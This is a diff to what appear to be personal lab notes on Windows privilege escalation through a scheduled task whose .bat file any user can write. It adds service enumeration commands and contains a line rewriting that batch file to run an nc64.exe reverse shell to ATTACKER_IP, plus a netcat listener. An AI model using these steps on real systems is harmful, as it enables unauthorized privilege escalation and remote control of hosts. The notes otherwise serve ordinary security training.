@@ -1,6 +1,17 @@
 Priviledges Scheduled Tasks:
+
+Find all services:
+-Tasklist \svc
+
+Find All services + Path:
+-wmic service get name,displayname,pathname,startmode
+
 To retrieve detailed information about any of the service
 -schtasks /query /tn vulntask /fo list /v
+
+View Details about SPECIFIC Service:
+-sc qc [service-name]
+
 
 what matters for us is the ###"Task to Run"#### parameter which indicates what gets executed by the scheduled task, 
 and the "Run As User" parameter, which shows the user that will be used to execute the task.
@@ -19,10 +30,10 @@ As can be seen in the result, the BUILTIN\Users group has full access (F) over t
 This means we can modify the .bat file and insert any payload we like. 
 
 For your convenience, nc64.exe can be found on C:\tools. Let's change the bat file to spawn a reverse shell:
--echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+-echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP [port] > C:\tasks\schtask.bat
 
 We then start a listener on the Our Kali machine on the same port we indicated on our reverse shell:
--nc -lvp 4444
+-nc -lvp [port]
 
 
 The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges
